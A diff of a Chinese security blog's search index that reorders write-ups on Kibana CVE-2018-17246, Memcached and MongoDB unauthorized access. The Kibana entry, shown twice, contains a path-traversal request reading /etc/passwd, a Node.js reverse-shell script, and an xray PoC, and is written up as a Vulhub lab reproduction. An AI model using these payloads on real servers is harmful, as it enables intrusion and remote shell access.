+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用Vulhub集成漏洞环境进行搭建，命令如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/kibana/CVE-2018-17246</span><br><span class="line"> </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>kibana默认端口为5601,环境搭建成功后访问Kibana默认首页。</p>
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125113942130.png" class title="image-20211125113942130">
+
+
+
+<h3 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h3><h4 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>这里通过设置apis参数为需要包含的文件，这里设置为&#x2F;etc&#x2F;passwd文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到服务器响应500</p>
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125134712598.png" class title="image-20211125134712598">
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose logs</span><br></pre></td></tr></table></figure>
+
+<p>查看kibana的日志，可以看到&#x2F;etc&#x2F;passwd文件已经被包含</p>
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125135321214.png" class title="image-20211125135321214">
+
+
+
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里我们写个反弹shell的js语句，将其放到kibana的docker镜像中</p>
+<p>js代码如下:</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/bash&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">12345</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将本地创建的文件复制到kibana镜像中的&#x2F;tmp&#x2F;shell.js文件</p>
+<p>命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp 你的文件路径 容器长ID:docker容器路径</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144232155.png" class title="image-20211125144232155">
+
+
+
+<p>进入kibana控制台命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose  exec   kibana  bash</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125142646488.png" class title="image-20211125142646488">
+
+
+
+<p>可以看到复制文件成功</p>
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144306987.png" class title="image-20211125144306987">
+
+
+
+<p>在浏览器中访问创建的shell.js文件</p>
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144616545.png" class title="image-20211125144616545">
+
+
+
+<p>文件包含成功，js语句执行成功，反弹shell</p>
+<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144839807.png" class title="image-20211125144839807">
+
+
+
+<h2 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h2><p>xray-poc:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name: poc-yaml-kibana-cve-2018-17246</span><br><span class="line">rules:</span><br><span class="line">  - method: GET</span><br><span class="line">    path: /api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</span><br><span class="line">    follow_redirects: false</span><br><span class="line">    expression: |</span><br><span class="line">      response.headers[&quot;kbn-name&quot;] == &quot;kibana&quot; &amp;&amp; response.content_type.contains(&quot;application/json&quot;) &amp;&amp; response.body.bcontains(bytes(&quot;\&quot;statusCode\&quot;:500&quot;)) &amp;&amp; response.body.bcontains(bytes(&quot;\&quot;message\&quot;:\&quot;An internal server error occurred\&quot;&quot;))</span><br><span class="line">detail:</span><br><span class="line">  author: canc3s(https://github.com/canc3s)</span><br><span class="line">  kibana_version: before 6.4.3 and 5.6.13</span><br><span class="line">  links:</span><br><span class="line">    - https://nvd.nist.gov/vuln/detail/CVE-2018-17246</span><br><span class="line">    - https://github.com/vulhub/vulhub/blob/master/kibana/CVE-2018-17246/README.md</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_27295403/article/details/100579631">(44条消息) 完美拷贝本地文件到docker容器_大唐锦绣的博客-CSDN博客_拷贝文件到docker容器</a></p>
+<p><a href="https://blog.csdn.net/nzjdsds/article/details/119039751">(44条消息) Kibana本地文件包含漏洞（CVE-2018-17246）_大方子-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>Web应用漏洞</category>
+        <category>Kibana</category>
+      </categories>
+      <tags>
+        <tag>-web应用漏洞 - Kibana -命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>java反射机制</title>
     <url>/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
     <content><![CDATA[<h1 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h1><p>本篇文章记录java的反射机制，虽然现在还不知道对渗透安全来说有什么好处，管他的，就是学@@</p>
@@ -974,104 +1075,78 @@
       </tags>
   </entry>
   <entry>
-    <title>Kibana本地文件包含漏洞(CVE-2018-17246)</title>
-    <url>/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/</url>
-    <content><![CDATA[<h1 id="Kibana本地文件包含漏洞（CVE-2018-17246）"><a href="#Kibana本地文件包含漏洞（CVE-2018-17246）" class="headerlink" title="Kibana本地文件包含漏洞（CVE-2018-17246）"></a>Kibana本地文件包含漏洞（CVE-2018-17246）</h1><hr>
-<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana 为 Elassticsearch 设计的一款开源的视图工具。其5.6.13到6.4.3之间的版本存在一处文件包含漏洞，通过这个漏洞攻击者可以包含任意服务器上的文件。此时，如果攻击者可以上传一个文件到服务器任意位置，即可执行代码。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ElasticSearch Kibana &lt; 6.4.3</span><br><span class="line">ElasticSearch Kibana &lt; 5.6.13</span><br></pre></td></tr></table></figure>
+    <title>Memcached 未授权访问漏洞</title>
+    <url>/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Memcached-未授权访问漏洞CVE-2013-7239"><a href="#Memcached-未授权访问漏洞CVE-2013-7239" class="headerlink" title="Memcached 未授权访问漏洞CVE-2013-7239"></a><strong>Memcached 未授权访问漏洞CVE-2013-7239</strong></h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>(1) 漏洞简述Memcached 是一套分布式高速缓存系统。它以 Key - Value<br>的形式将数据存储在内存中。这些数据通常是会被频繁地应用、读取的。正因为内存中数据的读取速度远远大于硬盘的读取速度所以可以用来加速应用的访问。由于<br>Memcached 的安全设计缺陷客户端连接 Memcached<br>服务器后无需认证就可读取、修改服务器缓存内容。</p>
+<p>(2) 风险等级高风险。</p>
+<p>(3) 漏洞编号CVE-2013-7239 。</p>
+<p>(4) 影响范围Memcached 全版本。</p>
+<h2 id="安装-Memcached"><a href="#安装-Memcached" class="headerlink" title="安装 Memcached"></a>安装 Memcached</h2><p>Linux系统安装memcached，首先要先安装libevent库。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libevent ibevent-dev     </span><br><span class="line">自动下载安装（Ubuntu/Debian）</span><br><span class="line"></span><br><span class="line">yum install libevent libevent-devel</span><br><span class="line">自动下载安装（Redhat/Fedora/Centos）</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="搜索规则"><a href="#搜索规则" class="headerlink" title="搜索规则"></a>搜索规则</h2><p>zoomeye:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="自动安装"><a href="#自动安装" class="headerlink" title="自动安装"></a>自动安装</h2><p><strong>Ubuntu&#x2F;Debian</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install memcached</span><br></pre></td></tr></table></figure>
+
+<p><strong>Redhat&#x2F;Fedora&#x2F;Centos</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install memcached</span><br></pre></td></tr></table></figure>
+
+<p><strong>FreeBSD</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">portmaster databases/memcached</span><br></pre></td></tr></table></figure>
 
 
 
-<p>Fofa:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
+<p>安装完后可以使用 whereis 查看命令的路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whereis memcached</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用Vulhub集成漏洞环境进行搭建，命令如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/kibana/CVE-2018-17246</span><br><span class="line"> </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>安装完成后，启动Mecached</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: /usr/bin/memcached  -u root -p 11211 -m 64m -vv</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/77972532663466b685d87df4f73addb5.png" class>
 
 
 
-<p>kibana默认端口为5601,环境搭建成功后访问Kibana默认首页。</p>
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125113942130.png" class title="image-20211125113942130">
+<p>使用netstat -an | more查看端口监听情况，回显0.0.0.0:<strong>11211</strong>表示在所有网卡进行监听</p>
+<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1b48f94a16e35db707079e0508b68384.png" class>
 
 
 
-<h3 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h3><h4 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>这里通过设置apis参数为需要包含的文件，这里设置为&#x2F;etc&#x2F;passwd文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<p>使用telnet连接11211端口，没有使用账号密码登录登陆成功</p>
+<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8888a9b284940445c4e06401f7c9219b.png" class>
 
 
 
-<p>可以看到服务器响应500</p>
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125134712598.png" class title="image-20211125134712598">
+<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1)配置访问控制。建议用户不要将服务发布到互联网上以防被黑客利用而可以通过安全组规则或<br>Iptables 配置访问控制规则只允许内部必需的用户地址访问命令如下 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp  -s  xxx.xxx.xxx.xxx  --dport  11211  -j ACCEPT</span><br></pre></td></tr></table></figure>
 
 
 
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose logs</span><br></pre></td></tr></table></figure>
-
-<p>查看kibana的日志，可以看到&#x2F;etc&#x2F;passwd文件已经被包含</p>
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125135321214.png" class title="image-20211125135321214">
+<p>(2) bind 指定监听 IP。如果 Memcached 没有在外网开放的必要可在 Memcached<br>启动时指定绑定的 IP 地址为 127.0.0.1。例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
 
 
 
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里我们写个反弹shell的js语句，将其放到kibana的docker镜像中</p>
-<p>js代码如下:</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/bash&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">12345</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<p>(3) 最小化权限运行。使用普通权限账号运行以下指定 memcached 用户运行 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
 
 
 
-<p>将本地创建的文件复制到kibana镜像中的&#x2F;tmp&#x2F;shell.js文件</p>
-<p>命令:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp 你的文件路径 容器长ID:docker容器路径</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144232155.png" class title="image-20211125144232155">
+<p>(4) 修改默认端口。修改默认 11211 监听端口为 11222 端口 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
 
 
 
-<p>进入kibana控制台命令:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose  exec   kibana  bash</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125142646488.png" class title="image-20211125142646488">
-
-
-
-<p>可以看到复制文件成功</p>
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144306987.png" class title="image-20211125144306987">
-
-
-
-<p>在浏览器中访问创建的shell.js文件</p>
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144616545.png" class title="image-20211125144616545">
-
-
-
-<p>文件包含成功，js语句执行成功，反弹shell</p>
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125144839807.png" class title="image-20211125144839807">
-
-
-
-<h2 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h2><p>xray-poc:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name: poc-yaml-kibana-cve-2018-17246</span><br><span class="line">rules:</span><br><span class="line">  - method: GET</span><br><span class="line">    path: /api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</span><br><span class="line">    follow_redirects: false</span><br><span class="line">    expression: |</span><br><span class="line">      response.headers[&quot;kbn-name&quot;] == &quot;kibana&quot; &amp;&amp; response.content_type.contains(&quot;application/json&quot;) &amp;&amp; response.body.bcontains(bytes(&quot;\&quot;statusCode\&quot;:500&quot;)) &amp;&amp; response.body.bcontains(bytes(&quot;\&quot;message\&quot;:\&quot;An internal server error occurred\&quot;&quot;))</span><br><span class="line">detail:</span><br><span class="line">  author: canc3s(https://github.com/canc3s)</span><br><span class="line">  kibana_version: before 6.4.3 and 5.6.13</span><br><span class="line">  links:</span><br><span class="line">    - https://nvd.nist.gov/vuln/detail/CVE-2018-17246</span><br><span class="line">    - https://github.com/vulhub/vulhub/blob/master/kibana/CVE-2018-17246/README.md</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_27295403/article/details/100579631">(44条消息) 完美拷贝本地文件到docker容器_大唐锦绣的博客-CSDN博客_拷贝文件到docker容器</a></p>
-<p><a href="https://blog.csdn.net/nzjdsds/article/details/119039751">(44条消息) Kibana本地文件包含漏洞（CVE-2018-17246）_大方子-CSDN博客</a></p>
+<p>(5) 备份数据。为避免数据丢失升级前应做好备份或建立硬盘快照。</p>
 ]]></content>
       <categories>
         <category>Web漏洞</category>
-        <category>Web应用漏洞</category>
-        <category>Kibana</category>
+        <category>未授权访问</category>
       </categories>
       <tags>
-        <tag>-web应用漏洞 - Kibana -命令执行</tag>
+        <tag>-Web漏洞 -未授权访问 -Memcached</tag>
       </tags>
   </entry>
   <entry>
@@ -1319,78 +1394,97 @@
       </tags>
   </entry>
   <entry>
-    <title>Memcached 未授权访问漏洞</title>
-    <url>/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="Memcached-未授权访问漏洞CVE-2013-7239"><a href="#Memcached-未授权访问漏洞CVE-2013-7239" class="headerlink" title="Memcached 未授权访问漏洞CVE-2013-7239"></a><strong>Memcached 未授权访问漏洞CVE-2013-7239</strong></h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>(1) 漏洞简述Memcached 是一套分布式高速缓存系统。它以 Key - Value<br>的形式将数据存储在内存中。这些数据通常是会被频繁地应用、读取的。正因为内存中数据的读取速度远远大于硬盘的读取速度所以可以用来加速应用的访问。由于<br>Memcached 的安全设计缺陷客户端连接 Memcached<br>服务器后无需认证就可读取、修改服务器缓存内容。</p>
-<p>(2) 风险等级高风险。</p>
-<p>(3) 漏洞编号CVE-2013-7239 。</p>
-<p>(4) 影响范围Memcached 全版本。</p>
-<h2 id="安装-Memcached"><a href="#安装-Memcached" class="headerlink" title="安装 Memcached"></a>安装 Memcached</h2><p>Linux系统安装memcached，首先要先安装libevent库。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libevent ibevent-dev     </span><br><span class="line">自动下载安装（Ubuntu/Debian）</span><br><span class="line"></span><br><span class="line">yum install libevent libevent-devel</span><br><span class="line">自动下载安装（Redhat/Fedora/Centos）</span><br></pre></td></tr></table></figure>
+    <title>MongoDB未授权访问漏洞</title>
+    <url>/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>测试环境：Centos7</p>
+<p>安装前先安装依赖包</p>
+<p><strong>Red Hat&#x2F;CentOS：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install libcurl openssl</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="自动安装"><a href="#自动安装" class="headerlink" title="自动安装"></a>自动安装</h2><p><strong>Ubuntu&#x2F;Debian</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install memcached</span><br></pre></td></tr></table></figure>
-
-<p><strong>Redhat&#x2F;Fedora&#x2F;Centos</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install memcached</span><br></pre></td></tr></table></figure>
-
-<p><strong>FreeBSD</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">portmaster databases/memcached</span><br></pre></td></tr></table></figure>
+<p><strong>Ubuntu 18.04 LTS (“Bionic”)&#x2F;Debian 10 “Buster”：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl4 openssl</span><br></pre></td></tr></table></figure>
 
 
 
-<p>安装完后可以使用 whereis 查看命令的路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whereis memcached</span><br></pre></td></tr></table></figure>
+<p><strong>Ubuntu 16.04 LTS (“Xenial”)&#x2F;Debian 9 “Stretch”：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl3 openssl</span><br></pre></td></tr></table></figure>
 
 
 
-<p>安装完成后，启动Mecached</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: /usr/bin/memcached  -u root -p 11211 -m 64m -vv</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/77972532663466b685d87df4f73addb5.png" class>
-
-
-
-<p>使用netstat -an | more查看端口监听情况，回显0.0.0.0:<strong>11211</strong>表示在所有网卡进行监听</p>
-<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1b48f94a16e35db707079e0508b68384.png" class>
+<p>下载MongoDB</p>
+<p>MongoDB 源码下载地址：<a href="https://www.mongodb.com/download-center/#community">https://www.mongodb.com/download-center\#community</a></p>
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1ed1e326da0b82a3ba6a9acc177ad6d1.jpg" class>
 
 
 
-<p>使用telnet连接11211端口，没有使用账号密码登录登陆成功</p>
-<img src="/2021/06/11/Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8888a9b284940445c4e06401f7c9219b.png" class>
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/5fc344136eee4a58c0d0dcd509a488df.jpg" class>
+
+<p>MongoDB的可执行文件在bin目录下，将其添加到$PATH路径中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=\&lt;mongodb-install-directory\&gt;/bin:\$PATH</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1)配置访问控制。建议用户不要将服务发布到互联网上以防被黑客利用而可以通过安全组规则或<br>Iptables 配置访问控制规则只允许内部必需的用户地址访问命令如下 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp  -s  xxx.xxx.xxx.xxx  --dport  11211  -j ACCEPT</span><br></pre></td></tr></table></figure>
+<p>创建数据库目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mkdir -p /data/db</span><br></pre></td></tr></table></figure>
 
 
 
-<p>(2) bind 指定监听 IP。如果 Memcached 没有在外网开放的必要可在 Memcached<br>启动时指定绑定的 IP 地址为 127.0.0.1。例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
+<p>创建数据库存放目录和日志</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /data               //创建数据库目录</span><br><span class="line"></span><br><span class="line">sudo mkdir db    //创建日志</span><br><span class="line"></span><br><span class="line">sudo touch log</span><br></pre></td></tr></table></figure>
 
 
 
-<p>(3) 最小化权限运行。使用普通权限账号运行以下指定 memcached 用户运行 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
+<p>命令行中启动MongoDB服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> cd 安装路径/mongo/bin</span><br><span class="line"></span><br><span class="line">sudo ./mongod --dbpath=/data/db --   logpath=/data/logs</span><br></pre></td></tr></table></figure>
 
 
 
-<p>(4) 修改默认端口。修改默认 11211 监听端口为 11222 端口 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P</span><br><span class="line">/tmp/memcached.pid</span><br></pre></td></tr></table></figure>
+<p>Mongodb启动成功</p>
+<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/393a5bd543d9da0ed85c0dec2efcdec4.png" class>
 
 
 
-<p>(5) 备份数据。为避免数据丢失升级前应做好备份或建立硬盘快照。</p>
